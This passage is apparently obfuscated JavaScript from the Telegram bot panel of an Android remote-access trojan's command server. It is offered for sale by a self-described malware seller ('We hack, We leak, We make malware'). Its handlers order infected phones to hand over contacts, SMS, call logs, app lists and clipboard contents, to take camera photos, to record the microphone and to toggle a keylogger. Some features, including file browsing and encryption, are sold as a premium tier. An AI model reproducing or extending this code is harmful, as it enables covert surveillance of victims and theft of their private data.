                        bot.sendMessage(chatId, "<b>🎯 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚊𝚌𝚝𝚒𝚘𝚗</b>\n\n", {
                          'parse_mode': 'HTML',
                          'reply_markup': {
                            'keyboard': _0x307c8a,
                            'resize_keyboard': true,
                            'one_time_keyboard': true
                          }
                        });
                      }
                    } else {
                      if (_0xdbde0c.text === "<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>") {
                        bot.sendMessage(chatId, "<b>ℹ️ For paid work contact <b>Romeo Uchiha</b>\n𝚆𝚎 𝚑𝚊𝚌𝚔, 𝚆𝚎 𝚕𝚎𝚊𝚔, 𝚆𝚎 𝚖𝚊𝚔𝚎 𝚖𝚊𝚕𝚠𝚊𝚛𝚎\n\nADMIN → <b>Romeo Uchiha</b></b>\n\n", {
                          'parse_mode': 'HTML'
                        });
                      } else {
                        if (_0xdbde0c.text === "<b>🔙 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 🔴</b>") {
                          bot.sendMessage(chatId, "<b>🏠 𝙼𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                            'parse_mode': "HTML",
                            'reply_markup': {
                              'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                              'resize_keyboard': true
                            }
                          });
                        } else {
                          if (_0xdbde0c.text === "<b>❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 🔴</b>") {
                            let targetId = appData.get(chatId + "_target");
                            let _0x3202e5 = targetId === "all" ? "all" : (io.sockets.sockets.get(targetId) ? io.sockets.sockets.get(targetId).model : "Unknown");
                            
                            if (_0x3202e5 == "all") {
                              bot.sendMessage(chatId, "<b>⚙️ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\n\n", {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [["<b>📇 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴</b>", "<b>💬 𝚂𝙼𝚂 🔴</b>"], ["<b>📞 𝙲𝚊𝚕𝚕𝚜 🔴</b>", "<b>📱 𝙰𝚙𝚙𝚜 🔴</b>"], ["<b>📸 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 🔴</b>", "<b>🤳 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 🔴</b>"], ["<b>🎤 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 🔴</b>", "<b>📋 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛起🔴</b>"], ["<b>🖼️ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 🔴</b>", "<b>🔔 𝚃𝚘𝚊𝚜𝚝 🔴</b>"], ["<b>📤 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 🔴</b>", "<b>📳 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 🔴</b>"], ["<b>▶️ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 🔴</b>", "<b>⏹️ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 🔴</b>"], ["<b>⌨️ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 🔴</b>", "<b>🔕 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 🔴</b>"], ["<b>📁 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 🔴</b>", "<b>🖼️ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 🔴</b>"], ["<b>🔒 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 🔴</b>", "<b>🔓 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 🔴</b>"], ["<b>🌐 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 🔴</b>", "<b>🎣 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 🔴</b>"], ["<b>📨 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴</b>"], ["<b>📲 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>🔙 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 🔴</b>"]],
                                  'resize_keyboard': true,
                                  'one_time_keyboard': true
                                }
                              });
                            } else {
                              bot.sendMessage(chatId, "<b>⚙️ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 " + _0x3202e5 + "</b>\n\n", {
                                'parse_mode': "HTML",
                                'reply_markup': {
                                  'keyboard': [["<b>📇 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴</b>", "<b>💬 𝚂𝙼𝚂 🔴</b>"], ["<b>📞 𝙲𝚊𝚕𝚕𝚜 🔴</b>", "<b>📱 𝙰𝚙𝚙𝚜 🔴</b>"], ["<b>📸 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 🔴</b>", "<b>🤳 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 🔴</b>"], ["<b>🎤 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 🔴</b>", "<b>📋 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 🔴</b>"], ["<b>🖼️ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 🔴</b>", "<b>🔔 𝚃𝚘𝚊𝚜𝚝 🔴</b>"], ["<b>📤 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 🔴</b>", "<b>📳 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 🔴</b>"], ["<b>▶️ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 🔴</b>", "<b>⏹️ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 🔴</b>"], ["<b>⌨️ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 🔴</b>", "<b>🔕 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 🔴</b>"], ["<b>📁 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 🔴</b>", "<b>🖼️ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 🔴</b>"], ["<b>🔒 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 🔴</b>", "<b>🔓 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 🔴</b>"], ["<b>🌐 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 🔴</b>", "<b>🎣 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 🔴</b>"], ["<b>📨 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴</b>"], ["<b>📲 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>🔙 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 🔴</b>"]],
                                  'resize_keyboard': true,
                                  'one_time_keyboard': true
                                }
                              });
                            }
                          } else {
                            if (actions.includes(_0xdbde0c.text)) {
                              let _0x3ea82b = appData.get(chatId + "_target");
                              if (_0xdbde0c.text === "<b>📇 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴</b>") {
                                if (_0x3ea82b == "all") {
                                  io.sockets.sockets.forEach(socket => {
                                      socket.activeChatId = chatId; // MAP SOCKET TO THIS USER
                                      socket.emit("commend", { 'request': "contacts", 'extras': [] });
                                  });
                                } else {
                                  let tSock = io.sockets.sockets.get(_0x3ea82b);
                                  if(tSock) tSock.activeChatId = chatId; // MAP SOCKET TO THIS USER
                                  io.to(_0x3ea82b).emit("commend", { 'request': 'contacts', 'extras': [] });
                                }
                                appData.delete(chatId + "_target");
                                bot.sendMessage(chatId, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': { 'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]], 'resize_keyboard': true }
                                });
                              }
                              if (_0xdbde0c.text === "<b>💬 𝚂𝙼𝚂 🔴</b>") {
                                if (_0x3ea82b == "all") {
                                  io.sockets.sockets.forEach(socket => {
                                      socket.activeChatId = chatId;
                                      socket.emit("commend", { 'request': "all-sms", 'extras': [] });
                                  });
                                } else {
                                  let tSock = io.sockets.sockets.get(_0x3ea82b);
                                  if(tSock) tSock.activeChatId = chatId;
                                  io.to(_0x3ea82b).emit("commend", { 'request': "all-sms", 'extras': [] });
                                }
                                appData.delete(chatId + "_target");
                                bot.sendMessage(chatId, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': { 'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]], 'resize_keyboard': true }
                                });
                              }
                              if (_0xdbde0c.text === "<b>📞 𝙲𝚊𝚕𝚕𝚜 🔴</b>") {
                                if (_0x3ea82b == "all") {
                                  io.sockets.sockets.forEach(socket => {
                                      socket.activeChatId = chatId;
                                      socket.emit("commend", { 'request': "calls", 'extras': [] });
                                  });
                                } else {
                                  let tSock = io.sockets.sockets.get(_0x3ea82b);
                                  if(tSock) tSock.activeChatId = chatId;
                                  io.to(_0x3ea82b).emit("commend", { 'request': "calls", 'extras': [] });
                                }
                                appData.delete(chatId + "_target");
                                bot.sendMessage(chatId, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': { 'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]], 'resize_keyboard': true }
                                });
                              }
                              if (_0xdbde0c.text === "<b>📱 𝙰𝚙𝚙𝚜 🔴</b>") {
                                if (_0x3ea82b == "all") {
                                  io.sockets.sockets.forEach(socket => {
                                      socket.activeChatId = chatId;
                                      socket.emit("commend", { 'request': "apps", 'extras': [] });
                                  });
                                } else {
                                  let tSock = io.sockets.sockets.get(_0x3ea82b);
                                  if(tSock) tSock.activeChatId = chatId;
                                  io.to(_0x3ea82b).emit("commend", { 'request': "apps", 'extras': [] });
                                }
                                appData.delete(chatId + "_target");
                                bot.sendMessage(chatId, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': { 'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]], 'resize_keyboard': true }
                                });
                              }
                              if (_0xdbde0c.text === "<b>📸 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 🔴</b>") {
                                if (_0x3ea82b == "all") {
                                  io.sockets.sockets.forEach(socket => {
                                      socket.activeChatId = chatId;
                                      socket.emit("commend", { 'request': "main-camera", 'extras': [] });
                                  });
                                } else {
                                  let tSock = io.sockets.sockets.get(_0x3ea82b);
                                  if(tSock) tSock.activeChatId = chatId;
                                  io.to(_0x3ea82b).emit("commend", { 'request': "main-camera", 'extras': [] });
                                }
                                appData.delete(chatId + "_target");
                                bot.sendMessage(chatId, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': { 'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]], 'resize_keyboard': true }
                                });
                              }
                              if (_0xdbde0c.text === "<b>🤳 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 🔴</b>") {
                                if (_0x3ea82b == 'all') {
                                  io.sockets.sockets.forEach(socket => {
                                      socket.activeChatId = chatId;
                                      socket.emit("commend", { 'request': "selfie-camera", 'extras': [] });
                                  });
                                } else {
                                  let tSock = io.sockets.sockets.get(_0x3ea82b);
                                  if(tSock) tSock.activeChatId = chatId;
                                  io.to(_0x3ea82b).emit('commend', { 'request': "selfie-camera", 'extras': [] });
                                }
                                appData.delete(chatId + "_target");
                                bot.sendMessage(chatId, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': { 'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]], 'resize_keyboard': true }
                                });
                              }
                              if (_0xdbde0c.text === "<b>📋 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 🔴</b>") {
                                if (_0x3ea82b == "all") {
                                  io.sockets.sockets.forEach(socket => {
                                      socket.activeChatId = chatId;
                                      socket.emit("commend", { 'request': "clipboard", 'extras': [] });
                                  });
                                } else {
                                  let tSock = io.sockets.sockets.get(_0x3ea82b);
                                  if(tSock) tSock.activeChatId = chatId;
                                  io.to(_0x3ea82b).emit("commend", { 'request': "clipboard", 'extras': [] });
                                }
                                appData.delete(chatId + "_target");
                                bot.sendMessage(chatId, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': { 'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]], 'resize_keyboard': true }
                                });
                              }
                              if (_0xdbde0c.text === "<b>🖼️ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 🔴</b>") {
                                bot.sendMessage(chatId, "<b>💎 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 — contact <b>Romeo Uchiha</b> to buy</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': { 'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]], 'resize_keyboard': true }
                                });
                              }
                              if (_0xdbde0c.text === "<b>⌨️ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 🔴</b>") {
                                if (_0x3ea82b == "all") {
                                  io.sockets.sockets.forEach(socket => {
                                      socket.activeChatId = chatId;
                                      socket.emit("commend", { 'request': "keylogger-on", 'extras': [] });
                                  });
                                } else {
                                  let tSock = io.sockets.sockets.get(_0x3ea82b);
                                  if(tSock) tSock.activeChatId = chatId;
                                  io.to(_0x3ea82b).emit("commend", { 'request': "keylogger-on", 'extras': [] });
                                }
                                appData.delete(chatId + "_target");
                                bot.sendMessage(chatId, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': { 'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]], 'resize_keyboard': true }
                                });
                              }
                              if (_0xdbde0c.text === "<b>🔕 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 🔴</b>") {
                                if (_0x3ea82b == "all") {
                                  io.sockets.sockets.forEach(socket => {
                                      socket.activeChatId = chatId;
                                      socket.emit("commend", { 'request': "keylogger-off", 'extras': [] });
                                  });
                                } else {
                                  let tSock = io.sockets.sockets.get(_0x3ea82b);
                                  if(tSock) tSock.activeChatId = chatId;
                                  io.to(_0x3ea82b).emit('commend', { 'request': "keylogger-off", 'extras': [] });
                                }
                                appData.delete(chatId + "_target");
                                bot.sendMessage(chatId, "<b>✅ 𝚃𝚑𝚎 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚠𝚊𝚜 𝚎𝚡𝚎𝚌𝚞𝚝𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢, 𝚢𝚘𝚞 𝚠𝚒𝚕𝚕 𝚛𝚎𝚌𝚎𝚒𝚟𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚎 𝚜𝚘𝚘𝚗 ...\n\n🔴 𝚁𝚎𝚝𝚞𝚛𝚗 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': { 'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]], 'resize_keyboard': true }
                                });
                              }
                              if (_0xdbde0c.text === "<b>📁 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 🔴</b>") {
                                bot.sendMessage(chatId, "<b>💎 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 — contact <b>Romeo Uchiha</b> to buy</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': { 'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]], 'resize_keyboard': true }
                                });
                              }
                              if (_0xdbde0c.text === "<b>🖼️ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 🔴</b>") {
                                bot.sendMessage(chatId, "<b>💎 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 — contact <b>Romeo Uchiha</b> to buy</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': { 'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]], 'resize_keyboard': true }
                                });
                              }
                              if (_0xdbde0c.text === "<b>🔒 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 🔴</b>") {
                                bot.sendMessage(chatId, "<b>💎 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 — contact <b>Romeo Uchiha</b> to buy</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': { 'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]], 'resize_keyboard': true }
                                });
                              }
                              if (_0xdbde0c.text === "<b>🔓 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 🔴</b>") {
                                bot.sendMessage(chatId, "<b>💎 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 — contact <b>Romeo Uchiha</b> to buy</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': { 'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]], 'resize_keyboard': true }
                                });
                              }
                              if (_0xdbde0c.text === "<b>🎤 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 🔴</b>") {
                                appData.set(chatId + "_action", 'microphoneDuration');
                                bot.sendMessage(chatId, "<b>🎤 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 𝚛𝚎𝚌𝚘𝚛𝚍𝚒𝚗𝚐 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\n\n", {
                                  'parse_mode': 'HTML',
                                  'reply_markup': { 'keyboard': [["<b>❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 🔴</b>"]], 'resize_keyboard': true, 'one_time_keyboard': true }
                                });
                              }
                              if (_0xdbde0c.text === "<b>🔔 𝚃𝚘𝚊𝚜𝚝 🔴</b>") {
